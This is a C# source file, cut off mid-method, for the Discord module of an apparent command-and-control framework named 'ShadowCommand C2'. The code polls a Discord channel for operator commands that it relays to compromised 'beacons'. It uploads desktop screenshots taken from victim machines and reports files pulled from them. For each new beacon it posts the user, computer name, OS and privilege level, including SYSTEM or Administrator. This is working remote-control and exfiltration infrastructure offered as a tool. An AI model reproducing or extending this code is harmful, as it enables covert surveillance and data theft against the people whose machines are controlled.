using System.Text;
using System.Text.Json;

namespace C2Framework
{
    public class DiscordNotificationManager
    {
        private string _discordBotToken = string.Empty;
        private string _discordChannelId = string.Empty;
        private string _discordGuildId = string.Empty;
        private bool _discordNotificationsEnabled = false;
        private readonly string _configPath;
        private readonly HttpClient _httpClient;
        private readonly object _pollingLock = new object();
        private bool _isCurrentlyPolling = false;
        private System.Threading.Timer _messagePollingTimer;
        private string _lastMessageId = string.Empty;
        private bool _isPollingEnabled = false;
        private readonly HashSet<string> _processedMessageIds = new HashSet<string>(); // Track processed messages

        // Events
        public event EventHandler<OutputMessageEventArgs> OutputMessage;
        public event EventHandler<DiscordCommandEventArgs> CommandReceived;
        private readonly Dictionary<string, DateTime> _lastCommandTime = new Dictionary<string, DateTime>();
        private readonly TimeSpan _commandCooldown = TimeSpan.FromSeconds(2);
        private bool _slashCommandsRegistered = false;
        private readonly object _registrationLock = new object();
        private readonly DateTime _startupTime = DateTime.UtcNow;
        private bool _autoUploadScreenshots = true;

        public DiscordNotificationManager()
        {
            _configPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "discord_config.txt");
            _httpClient = new HttpClient();

            // Log startup time for debugging
            RaiseOutputMessage($"[*] Discord Manager initialized at: {_startupTime:yyyy-MM-dd HH:mm:ss UTC}", Color.Gray);

            LoadDiscordConfig();
        }
        public bool IsEnabled => _discordNotificationsEnabled;
        public bool IsConfigured => !string.IsNullOrEmpty(_discordBotToken) &&
                                   !string.IsNullOrEmpty(_discordChannelId);


        public async Task SendScreenshotToDiscord(string beaconId, string screenshotPath, long fileSize)
        {
            if (!_discordNotificationsEnabled || !IsConfigured || !_autoUploadScreenshots)
                return;

            try
            {
                if (!File.Exists(screenshotPath))
                {
                    RaiseOutputMessage($"[!] Screenshot file not found: {screenshotPath}", Color.Red);
                    return;
                }

                RaiseOutputMessage($"[*] Uploading screenshot to Discord...", Color.Yellow);

                // Check file size (Discord limit is 25MB, but we'll use 8MB for safety)
                if (fileSize > 8 * 1024 * 1024) // 8MB limit
                {
                    await SendDiscordMessage($"📸 **Screenshot captured from {beaconId}**\n" +
                                           $"⚠️ File too large ({FormatFileSize(fileSize)}) - saved locally only\n" +
                                           $"📁 **Location:** `{Path.GetFileName(screenshotPath)}`\n" +
                                           $"🕒 **Time:** {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss UTC}");
                    return;
                }

                // Create multipart form for file upload
                using (var httpClient = new HttpClient())
                using (var form = new MultipartFormDataContent())
                {
                    var fileBytes = await File.ReadAllBytesAsync(screenshotPath);
                    var fileContent = new ByteArrayContent(fileBytes);
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                    form.Add(fileContent, "file", Path.GetFileName(screenshotPath));

                    var embed = new
                    {
                        embeds = new[]
                        {
                    new
                    {
                        title = "📸 Desktop Screenshot Captured",
                        description = $"**🎯 Beacon:** `{beaconId}`\n**📊 Size:** {FormatFileSize(fileSize)}\n**🕒 Captured:** {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss UTC}",
                        color = 0x00FF00, // Green
                        timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                        footer = new { text = "ShadowCommand C2 - Screenshot Service 📷" }
                    }
                }
                    };

                    var payloadJson = JsonSerializer.Serialize(embed);
                    form.Add(new StringContent(payloadJson), "payload_json");

                    // Set Discord bot authorization
                    httpClient.DefaultRequestHeaders.Clear();
                    httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                    // Upload to Discord
                    string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages";
                    var response = await httpClient.PostAsync(url, form);

                    if (response.IsSuccessStatusCode)
                    {
                        RaiseOutputMessage($"[+] Screenshot uploaded to Discord successfully! 📸", Color.Green);
                    }
                    else
                    {
                        string error = await response.Content.ReadAsStringAsync();
                        RaiseOutputMessage($"[!] Failed to upload screenshot to Discord: {error}", Color.Red);

                        // Fallback: Send text notification
                        await SendDiscordMessage($"📸 **Screenshot captured from {beaconId}**\n" +
                                               $"❌ Upload failed - saved locally only\n" +
                                               $"📁 **File:** `{Path.GetFileName(screenshotPath)}`");
                    }
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error uploading screenshot to Discord: {ex.Message}", Color.Red);
                await LogDiscordError($"Screenshot upload error: {ex.Message}");

                // Fallback notification
                try
                {
                    await SendDiscordMessage($"📸 **Screenshot captured from {beaconId}**\n" +
                                           $"⚠️ Auto-upload failed - check server logs\n" +
                                           $"📁 **Saved locally:** `{Path.GetFileName(screenshotPath)}`");
                }
                catch { /* Ignore fallback errors */ }
            }
        }

        // Toggle screenshot auto-upload
        public void ToggleScreenshotAutoUpload(bool enable)
        {
            _autoUploadScreenshots = enable;
            RaiseOutputMessage($"[*] Discord screenshot auto-upload {(enable ? "enabled" : "disabled")}",
                               enable ? Color.Green : Color.Yellow);
        }
        private void LoadDiscordConfig()
        {
            try
            {
                if (!File.Exists(_configPath))
                {
                    CreateDefaultDiscordConfig();
                    return;
                }

                string[] lines = File.ReadAllLines(_configPath);
                foreach (string line in lines)
                {
                    if (line.StartsWith("#") || string.IsNullOrWhiteSpace(line))
                        continue;

                    string[] parts = line.Split('=', 2);
                    if (parts.Length != 2) continue;

                    string key = parts[0].Trim().ToLower();
                    string value = parts[1].Trim();

                    switch (key)
                    {
                        case "enabled":
                            bool.TryParse(value, out _discordNotificationsEnabled);
                            break;
                        case "token":
                            if (value != "YOUR_BOT_TOKEN_HERE")
                                _discordBotToken = value;
                            break;
                        case "channelid":
                            if (value != "YOUR_CHANNEL_ID_HERE")
                                _discordChannelId = value;
                            break;
                        case "guildid":
                            if (value != "YOUR_GUILD_ID_HERE")
                                _discordGuildId = value;
                            break;
                    }
                }

                // Validate configuration
                if (_discordNotificationsEnabled && (!IsConfigured))
                {
                    _discordNotificationsEnabled = false;
                    RaiseOutputMessage("[!] Discord notifications disabled - invalid configuration", Color.Red);
                }
                else if (IsConfigured && _discordNotificationsEnabled)
                {
                    RaiseOutputMessage("[+] Discord notifications enabled", Color.Green);
                    StartMessagePolling();
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error loading Discord config: {ex.Message}", Color.Red);
            }
        }
        public void ResetRegistration()
        {
            lock (_registrationLock)
            {
                _slashCommandsRegistered = false;
            }
            RaiseOutputMessage("[*] Discord slash command registration reset", Color.Yellow);
        }
        private void CreateDefaultDiscordConfig()
        {
            try
            {
                string[] templateLines = {
                    "# Discord Bot Configuration",
                    "# Set enabled=true once you've configured your bot",
                    "enabled=false",
                    "",
                    "# Bot token from Discord Developer Portal",
                    "token=YOUR_BOT_TOKEN_HERE",
                    "",
                    "# Channel ID where notifications will be sent",
                    "channelid=YOUR_CHANNEL_ID_HERE",
                    "",
                    "# Guild (Server) ID for slash commands",
                    "guildid=YOUR_GUILD_ID_HERE",
                    "",
                    "# File format: key=value, one setting per line",
                    "# Restart the C2 server after editing this file"
                };

                File.WriteAllLines(_configPath, templateLines);
                RaiseOutputMessage($"[*] Created template Discord config file at: {_configPath}", Color.Yellow);
                RaiseOutputMessage("[*] Edit this file with your Discord bot credentials to enable notifications", Color.Yellow);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error creating Discord config template: {ex.Message}", Color.Red);
            }
        }

        private void StartMessagePolling()
        {
            if (_isPollingEnabled || !IsConfigured) return;

            _isPollingEnabled = true;
            RaiseOutputMessage("[*] Starting Discord command polling...", Color.Cyan);

            // Increase polling interval to reduce duplicates
            _messagePollingTimer = new System.Threading.Timer(async _ => await PollForMessages(), null,
                TimeSpan.FromSeconds(3), TimeSpan.FromSeconds(3)); // Increased intervals
        }
        private void StopMessagePolling()
        {
            _isPollingEnabled = false;
            _messagePollingTimer?.Dispose();
            _messagePollingTimer = null;
            RaiseOutputMessage("[*] Discord command polling stopped", Color.Yellow);
        }

        private async Task PollForMessages()
        {
            lock (_pollingLock)
            {
                if (_isCurrentlyPolling || !_isPollingEnabled || !IsConfigured)
                {
                    return;
                }
                _isCurrentlyPolling = true;
            }

            try
            {
                string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages?limit=5";

                if (!string.IsNullOrEmpty(_lastMessageId))
                {
                    url += $"&after={_lastMessageId}";
                }

                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                var response = await _httpClient.GetAsync(url);
                if (!response.IsSuccessStatusCode)
                {
                    return;
                }

                string jsonResponse = await response.Content.ReadAsStringAsync();
                var messages = JsonSerializer.Deserialize<JsonElement[]>(jsonResponse);

                if (messages.Length == 0) return;

                // Sort messages by timestamp (oldest first)
                var sortedMessages = messages.OrderBy(m =>
                {
                    if (m.TryGetProperty("timestamp", out var timestamp))
                    {
                        return DateTime.Parse(timestamp.GetString());
                    }
                    return DateTime.MinValue;
                }).ToArray();

                // Process only NEW messages
                foreach (var message in sortedMessages)
                {
                    string messageId = message.GetProperty("id").GetString();

                    // Skip if already processed
                    if (_processedMessageIds.Contains(messageId))
                    {
                        continue;
                    }

                    await ProcessDiscordMessage(message);

                    // Update last message ID
                    _lastMessageId = messageId;
                }

                // Clean up old processed message IDs (keep only last 100)
                if (_processedMessageIds.Count > 100)
                {
                    var messagesToRemove = _processedMessageIds.Take(_processedMessageIds.Count - 50).ToList();
                    foreach (var msgId in messagesToRemove)
                    {
                        _processedMessageIds.Remove(msgId);
                    }
                }
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Polling error: {ex.Message}");
            }
            finally
            {
                lock (_pollingLock)
                {
                    _isCurrentlyPolling = false;
                }
            }
        }

        private async Task ProcessDiscordMessage(JsonElement message)
        {
            try
            {
                string messageId = message.GetProperty("id").GetString();
                string content = message.GetProperty("content").GetString();

                Console.WriteLine($"[DEBUG] Processing attempt for message {messageId}: {content}");
                Console.WriteLine($"[DEBUG] Already processed? {_processedMessageIds.Contains(messageId)}");
                Console.WriteLine($"[DEBUG] Total processed messages: {_processedMessageIds.Count}");

                if (_processedMessageIds.Contains(messageId))
                {
                    Console.WriteLine($"[DEBUG] Skipping already processed message {messageId}");
                    return;
                }

                _processedMessageIds.Add(messageId);
                Console.WriteLine($"[DEBUG] Added {messageId} to processed list");

                var author = message.GetProperty("author");
                string authorId = author.GetProperty("id").GetString();
                string authorName = author.GetProperty("username").GetString();
                bool isBot = author.TryGetProperty("bot", out var botProp) && botProp.GetBoolean();

                // Skip bot messages
                if (isBot) return;

                // Skip empty messages
                if (string.IsNullOrWhiteSpace(content)) return;

                // Check timestamp
                if (message.TryGetProperty("timestamp", out var timestampProp))
                {
                    if (DateTime.TryParse(timestampProp.GetString(), out DateTime messageTime))
                    {
                        DateTime messageTimeUtc = messageTime.Kind == DateTimeKind.Utc ? messageTime : messageTime.ToUniversalTime();

                        if (messageTimeUtc <= _startupTime)
                        {
                            Console.WriteLine($"[DEBUG] Message too old: {messageTimeUtc} <= {_startupTime}");
                            return;
                        }

                        if (DateTime.UtcNow - messageTimeUtc > TimeSpan.FromMinutes(1))
                        {
                            Console.WriteLine($"[DEBUG] Message older than 1 minute");
                            return;
                        }
                    }
                }

                string command;
                bool isBuiltInCommand = false;

                // Check if it's a built-in command (starts with !)
                if (content.StartsWith("!"))
                {
                    command = content.Substring(1).Trim();
                    isBuiltInCommand = true;
                }
                else
                {
                    command = content.Trim();
                    isBuiltInCommand = false;

                    if (IsLikelyChat(command))
                    {
                        Console.WriteLine($"[DEBUG] Skipping chat message: {command}");
                        return;
                    }
                }

                // Prevent command spam/duplicates
                if (!ShouldProcessCommand(command, authorId))
                {
                    Console.WriteLine($"[DEBUG] Command spam protection triggered for: {command}");
                    await ReactToMessage(messageId, "⏳");
                    return;
                }

                Console.WriteLine($"[DEBUG] About to log and process command: {command}");

                // Log the command (single log entry)
                string commandType = isBuiltInCommand ? "BUILT-IN" : "DIRECT";
                //    RaiseOutputMessage($"[DISCORD] Processing {commandType} command from {authorName}: {command}", Color.Magenta);

                Console.WriteLine($"[DEBUG] About to raise CommandReceived event");

                // Raise command event for the C2 server to handle
                CommandReceived?.Invoke(this, new DiscordCommandEventArgs
                {
                    Command = command,
                    AuthorName = authorName,
                    AuthorId = authorId,
                    MessageId = messageId,
                    IsBuiltIn = isBuiltInCommand
                });

                Console.WriteLine($"[DEBUG] CommandReceived event raised");

                // React to show command was received
                await ReactToMessage(messageId, "✅");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] Exception in ProcessDiscordMessage: {ex.Message}");
                await LogDiscordError($"Error processing message: {ex.Message}");
            }
        }

        private bool IsLikelyChat(string content)
        {
            // Skip messages that look like chat rather than commands
            string[] chatIndicators = { "hello", "hi", "hey", "thanks", "thank you", "lol", "haha", "ok", "okay", "yes", "no", "maybe" };
            string lowerContent = content.ToLower();

            // If it contains common chat words, probably not a command
            if (chatIndicators.Any(word => lowerContent.Contains(word)))
                return true;

            // If it's a long sentence (more than 4 words), probably chat
            if (content.Split(' ').Length > 4)
                return true;

            // If it contains question marks or exclamations, probably chat
            if (content.Contains("?") || content.Contains("!"))
                return true;

            return false; // Looks like a command
        }
        private bool ShouldProcessCommand(string command, string userId)
        {
            string key = $"{userId}:{command}";
            DateTime now = DateTime.UtcNow;

            if (_lastCommandTime.ContainsKey(key))
            {
                TimeSpan timeSinceLastCommand = now - _lastCommandTime[key];

                // Increase cooldown for exact duplicate commands
                TimeSpan cooldownPeriod = TimeSpan.FromSeconds(5); // Increased from 3 to 5 seconds

                if (timeSinceLastCommand < cooldownPeriod)
                {
                    RaiseOutputMessage($"[DISCORD] Duplicate command '{command}' blocked (cooldown: {timeSinceLastCommand.TotalSeconds:F1}s)", Color.Yellow);
                    return false;
                }
            }

            _lastCommandTime[key] = now;

            // Clean old entries more aggressively
            var keysToRemove = _lastCommandTime.Where(kvp => now - kvp.Value > TimeSpan.FromMinutes(2))
                                              .Select(kvp => kvp.Key)
                                              .ToList();

            foreach (var keyToRemove in keysToRemove)
            {
                _lastCommandTime.Remove(keyToRemove);
            }

            return true;
        }
        private string FormatFileSize(long bytes)
        {
            if (bytes == 0) return "0 B";
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            double len = bytes;
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }

        // Helper method to send Discord embeds
        private async Task SendDiscordEmbed(object embed)
        {
            try
            {
                string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages";
                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                string json = JsonSerializer.Serialize(embed);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await _httpClient.PostAsync(url, content);
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending Discord embed: {ex.Message}");
            }
        }

        // Enhanced screenshot notification
        public async Task NotifyScreenshotComplete(string beaconId, string filename, long fileSize, string downloadPath)
        {
            try
            {
                if (!_discordNotificationsEnabled || !IsConfigured)
                    return;

                string fileSizeFormatted = FormatFileSize(fileSize);

                var embed = new
                {
                    embeds = new[]
                    {
                new
                {
                    title = "📸 Screenshot Captured Successfully",
                    color = 0x00FF00, // Green
                    fields = new[]
                    {
                        new { name = "🎯 Beacon ID", value = beaconId, inline = true },
                        new { name = "📁 Filename", value = filename, inline = true },
                        new { name = "📊 File Size", value = fileSizeFormatted, inline = true },
                        new { name = "📍 Location", value = "Server Downloads Directory", inline = false },
                        new { name = "⏰ Captured", value = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss UTC"), inline = true }
                    },
                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                    footer = new { text = "ShadowCommand C2 - Screenshot Service" }
                }
            }
                };

                await SendDiscordEmbed(embed);
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending screenshot notification: {ex.Message}");
            }
        }

        // Enhanced download notification
        public async Task NotifyDownloadComplete(string beaconId, string filename, long fileSize, bool success = true)
        {
            try
            {
                if (!_discordNotificationsEnabled || !IsConfigured)
                    return;

                string emoji = success ? "📥✅" : "📥❌";
                string status = success ? "Download Completed" : "Download Failed";
                int color = success ? 0x00FF00 : 0xFF0000;
                string fileSizeFormatted = FormatFileSize(fileSize);

                var embed = new
                {
                    embeds = new[]
                    {
                new
                {
                    title = $"{emoji} {status}",
                    color = color,
                    fields = new[]
                    {
                        new { name = "🎯 Beacon ID", value = beaconId, inline = true },
                        new { name = "📁 Filename", value = filename, inline = true },
                        new { name = "📊 File Size", value = fileSizeFormatted, inline = true },
                        new { name = "📍 Saved To", value = "Server Downloads Directory", inline = false }
                    },
                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                    footer = new { text = "ShadowCommand C2 - File Transfer Service" }
                }
            }
                };

                await SendDiscordEmbed(embed);
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending download notification: {ex.Message}");
            }
        }
        private async Task ReactToMessage(string messageId, string emoji)
        {
            try
            {
                string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages/{messageId}/reactions/{emoji}/@me";

                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                await _httpClient.PutAsync(url, null);
            }
            catch
            {
                // Ignore reaction errors
            }
        }


        public async Task SendDiscordMessage(string message, bool isEmbed = false)
        {
            if (!_discordNotificationsEnabled || !IsConfigured)
                return;

            try
            {
                string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages";

                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                object payload;
                if (isEmbed)
                {
                    payload = new
                    {
                        embeds = new[]
                        {
                            new
                            {
                                title = "🚨 C2 Server Alert",
                                description = message,
                                color = 0xFF0000, // Red colour
                                timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                                footer = new { text = "Shadow Command C2" }
                            }
                        }
                    };
                }
                else
                {
                    payload = new { content = message };
                }

                string json = JsonSerializer.Serialize(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                var response = await _httpClient.PostAsync(url, content);
                if (!response.IsSuccessStatusCode)
                {
                    string error = await response.Content.ReadAsStringAsync();
                    await LogDiscordError($"Discord API error: {error}");
                }
            }
            catch (Exception ex)
            {
                await LogDiscordError($"{DateTime.Now}: {ex.Message}");
            }
        }

        public async Task SendCommandResponse(string response, string originalMessageId = null)
        {
            try
            {
                // Format the response nicely
                string formattedResponse = $"```\n{response}\n```";

                if (originalMessageId != null)
                {
                    // Reply to the original message
                    await SendDiscordMessage($"**Command Result:**\n{formattedResponse}");
                }
                else
                {
                    await SendDiscordMessage(formattedResponse);
                }
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending command response: {ex.Message}");
            }
        }

        public async Task NotifyNewBeacon(ClientHandler client)
        {
            if (!_discordNotificationsEnabled || !IsConfigured)
                return;

            try
            {
                // Wait for system info like Telegram implementation
                if (!client.IsEncrypted)
                {
                    await Task.Delay(3000);
                }
                else
                {
                    await Task.Delay(2000);
                }

                string privilegeText = client.IsAdmin ? "Administrator" : "Standard User";
                string privilegeEmoji = client.IsAdmin ? "👑" : "👤";

                string userDisplay = client.UserName;
                if (string.IsNullOrEmpty(userDisplay) || userDisplay == "Unknown")
                {
                    userDisplay = "Gathering...";
                }
                else if (userDisplay.EndsWith("$"))
                {
                    // Computer account (always high privilege)
                    privilegeText = "Computer Account (High Privilege)";
                    privilegeEmoji = "🖥️";
                }
                else if (userDisplay.Contains("SYSTEM") || userDisplay.Contains("NT AUTHORITY"))
                {
                    // System account (highest privilege)
                    privilegeText = "SYSTEM Account";
                    privilegeEmoji = "⚡";
                }

                var embed = new
                {
                    embeds = new[]
                    {
                new
                {
                    title = "🚨 New Beacon Connected!",
                    color = 0x00FF00, // Green colour
                    fields = new[]
                    {
                        new { name = "🆔 ID", value = client.ClientId, inline = true },
                        new { name = "🌍 IP", value = client.ClientInfo, inline = true },
                        new { name = "🔐 Connection", value = client.IsEncrypted ?
                            $"🔒 Encrypted (TLS {client.TlsProtocol})" :
                            "🔓 Plain Text - INSECURE", inline = true },
                        new { name = "👤 User", value = userDisplay, inline = true },
                        new { name = "🖥️ Computer", value = string.IsNullOrEmpty(client.ComputerName) ?
                            "Gathering..." : client.ComputerName, inline = true },
                        new { name = "💻 OS", value = string.IsNullOrEmpty(client.OSVersion) ||
                            client.OSVersion == "Unknown" ? "Gathering..." : client.OSVersion, inline = true },
                        new { name = $"{privilegeEmoji} Privileges", value = privilegeText, inline = true },
                        new { name = "🛡️ Shell", value = client.ShellType ?? "Unknown", inline = true },
                        new { name = "⏰ Connected", value = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss UTC"), inline = true }
                    },
                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                    footer = new { text = "Shadow Command C2 - Use !help for commands" }
                }
            }
                };

                string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages";

                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                string json = JsonSerializer.Serialize(embed);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                await _httpClient.PostAsync(url, content);
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error notifying new beacon: {ex.Message}");
            }
        }
        public void ConfigureDiscordBot(string token, string channelId, string guildId = "")
        {
            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(channelId))
            {
                RaiseOutputMessage("[!] Token and channel ID are required", Color.Red);
                return;
            }

            _discordBotToken = token;
            _discordChannelId = channelId;
            if (!string.IsNullOrEmpty(guildId))
                _discordGuildId = guildId;

            try
            {
                string[] correctLines = {
                    "# Discord Bot Configuration",
                    "# Set enabled=true once you've configured your bot",
                    "enabled=true",
                    "",
                    "# Bot token from Discord Developer Portal",
                    $"token={token}",
                    "",
                    "# Channel ID where notifications will be sent",
                    $"channelid={channelId}",
                    "",
                    "# Guild (Server) ID for slash commands",
                    $"guildid={guildId}",
                    "",
                    "# File format: key=value, one setting per line",
                    "# Restart the C2 server after editing this file"
                };

                File.WriteAllLines(_configPath, correctLines);
                RaiseOutputMessage("[+] Discord bot settings updated", Color.Green);
                RaiseOutputMessage($"[*] Token: {token.Substring(0, 10)}...", Color.Gray);
                RaiseOutputMessage($"[*] Channel ID: {channelId}", Color.Gray);
                if (!string.IsNullOrEmpty(guildId))
                    RaiseOutputMessage($"[*] Guild ID: {guildId}", Color.Gray);

                _discordNotificationsEnabled = true;



                StartMessagePolling();

                _ = Task.Run(async () =>
                {
                    await SendDiscordMessage("🤖 Discord bot configured and online! Use **!help** for available commands.", true);
                });
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error updating Discord config: {ex.Message}", Color.Red);
            }
        }

        public void ToggleDiscordNotifications(bool enable)
        {
            _discordNotificationsEnabled = enable;

            try
            {
                if (File.Exists(_configPath))
                {
                    string[] lines = File.ReadAllLines(_configPath);
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i].StartsWith("enabled=", StringComparison.OrdinalIgnoreCase))
                        {
                            lines[i] = $"enabled={enable.ToString().ToLower()}";
                            break;
                        }
                    }

                    File.WriteAllLines(_configPath, lines);
                    RaiseOutputMessage($"[*] Discord notifications {(enable ? "enabled" : "disabled")}", enable ? Color.Green : Color.Yellow);

                    if (enable && IsConfigured)
                    {
                        StartMessagePolling();
                        _ = Task.Run(async () => await SendDiscordMessage($"🔔 Discord notifications {(enable ? "enabled" : "disabled")}"));
                    }
                    else if (!enable)
                    {
                        StopMessagePolling();
                    }
                }
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error updating Discord config: {ex.Message}", Color.Red);
            }
        }

        public async Task TestDiscordNotification()
        {
            if (!IsConfigured)
            {
                RaiseOutputMessage("[!] Discord bot not configured. Use 'discord_config <token> <channelid> [guildid]' first", Color.Red);
                return;
            }

            RaiseOutputMessage("[*] Sending test notification to Discord...", Color.Yellow);

            bool wasEnabled = _discordNotificationsEnabled;
            _discordNotificationsEnabled = true;

            try
            {
                await SendDiscordMessage("🔔 **Test Notification**\n\nYour C2 server Discord notifications are working correctly!\n\n**Available Commands:**\n`!help` - Show available commands\n`!status` - Show server status\n`!beacons` - List active beacons", true);
                RaiseOutputMessage("[+] Test notification sent", Color.Green);
            }
            catch (Exception ex)
            {
                RaiseOutputMessage($"[!] Error sending test notification: {ex.Message}", Color.Red);
            }

            _discordNotificationsEnabled = wasEnabled;
        }

        public void ShowDiscordStatus()
        {
            RaiseOutputMessage("\n=== Discord Notification Status ===", Color.Cyan);

            if (!IsConfigured)
            {
                RaiseOutputMessage("[!] Discord bot not configured", Color.Red);
                RaiseOutputMessage("[*] Use 'discord_config <token> <channelid> [guildid]' to configure", Color.Yellow);
            }
            else
            {
                RaiseOutputMessage($"[*] Discord bot: Configured", Color.Green);
                RaiseOutputMessage($"[*] Notifications: {(_discordNotificationsEnabled ? "Enabled" : "Disabled")}",
                    _discordNotificationsEnabled ? Color.Green : Color.Yellow);
                RaiseOutputMessage($"[*] Command Polling: {(_isPollingEnabled ? "Active" : "Inactive")}",
                    _isPollingEnabled ? Color.Green : Color.Yellow);
                RaiseOutputMessage($"[*] Bot Token: {_discordBotToken?.Substring(0, 10)}...", Color.Gray);
                RaiseOutputMessage($"[*] Channel ID: {_discordChannelId}", Color.Gray);
                if (!string.IsNullOrEmpty(_discordGuildId))
                    RaiseOutputMessage($"[*] Guild ID: {_discordGuildId}", Color.Gray);
                RaiseOutputMessage("[*] Commands:", Color.Cyan);
                RaiseOutputMessage("  discord_on        - Enable notifications", Color.Cyan);
                RaiseOutputMessage("  discord_off       - Disable notifications", Color.Cyan);
                RaiseOutputMessage("  discord_test      - Send test notification", Color.Cyan);
                if (!string.IsNullOrEmpty(_discordGuildId))
                    RaiseOutputMessage("  discord_commands  - Register slash commands", Color.Cyan);
                RaiseOutputMessage("[*] Discord Commands (in Discord channel):", Color.Cyan);
                RaiseOutputMessage("  !help             - Show available commands", Color.Cyan);
                RaiseOutputMessage("  !status           - Show server status", Color.Cyan);
                RaiseOutputMessage("  !beacons          - List active beacons", Color.Cyan);
                RaiseOutputMessage("  !connect <id>     - Connect to a beacon", Color.Cyan);
                RaiseOutputMessage("  !disconnect       - Disconnect from current beacon", Color.Cyan);
            }

            RaiseOutputMessage("\n===================================", Color.Cyan);
        }

        public async Task NotifyServerShutdown()
        {
            if (_discordNotificationsEnabled && IsConfigured)
            {
                try
                {
                    await SendDiscordMessage($"🛑 C2 Server shutdown at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                }
                catch
                {
                }
            }

            // Stop polling
            StopMessagePolling();
        }

        private async Task LogDiscordError(string errorMessage)
        {
            try
            {
                await File.AppendAllTextAsync("discord_errors.log", errorMessage + "\n");
            }
            catch
            {
            }
        }

        private void RaiseOutputMessage(string message, Color color)
        {
            try
            {
                OutputMessage?.Invoke(this, new OutputMessageEventArgs(message, color));
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in DiscordNotificationManager.RaiseOutputMessage: {ex.Message}");
                Console.WriteLine($"Original message was: {message}");
            }
        }

        public async Task SendFormattedCommandResponse(string response, string originalMessageId = null, bool isError = false)
        {
            try
            {
                if (response.Length > 1800)
                {
                    var chunks = SplitResponse(response, 1800);
                    foreach (var chunk in chunks)
                    {
                        await SendDiscordMessage($"```\n{chunk}\n```");
                        await Task.Delay(1000); // Prevent rate limiting
                    }
                }
                else
                {
                    string emoji = isError ? "❌" : "✅";
                    string formattedResponse = $"{emoji} **Command Result:**\n```\n{response}\n```";
                    await SendDiscordMessage(formattedResponse);
                }
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending formatted command response: {ex.Message}");
            }
        }

        private List<string> SplitResponse(string response, int maxLength)
        {
            var chunks = new List<string>();
            var lines = response.Split('\n');
            var currentChunk = new StringBuilder();

            foreach (var line in lines)
            {
                if (currentChunk.Length + line.Length + 1 > maxLength)
                {
                    if (currentChunk.Length > 0)
                    {
                        chunks.Add(currentChunk.ToString());
                        currentChunk.Clear();
                    }
                }

                if (currentChunk.Length > 0)
                    currentChunk.AppendLine();
                currentChunk.Append(line);
            }

            if (currentChunk.Length > 0)
            {
                chunks.Add(currentChunk.ToString());
            }

            return chunks;
        }

        // Send status update with embed
        public async Task SendStatusUpdate(string title, string description, string color = "00FF00")
        {
            try
            {
                var embed = new
                {
                    embeds = new[]
                    {
                new
                {
                    title = title,
                    description = description,
                    color = Convert.ToInt32(color, 16),
                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
                    footer = new { text = "ShadowCommand C2" }
                }
            }
                };

                string url = $"https://discord.com/api/v10/channels/{_discordChannelId}/messages";
                _httpClient.DefaultRequestHeaders.Clear();
                _httpClient.DefaultRequestHeaders.Add("Authorization", $"Bot {_discordBotToken}");

                string json = JsonSerializer.Serialize(embed);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await _httpClient.PostAsync(url, content);
            }
            catch (Exception ex)
            {
                await LogDiscordError($"Error sending status update: {ex.Message}");
            }
        }

        // Send file upload notification
        public async Task NotifyFileOperation(string operation, string filename, string beaconId, bool success = true)
        {
            try
            {
                string emoji = success ? "✅" : "❌";
                string status = success ? "completed" : "failed";
                string color = success ? "00FF00" : "FF0000";

                await SendStatusUpdate(
                    $"{emoji} File {operation} {status}",
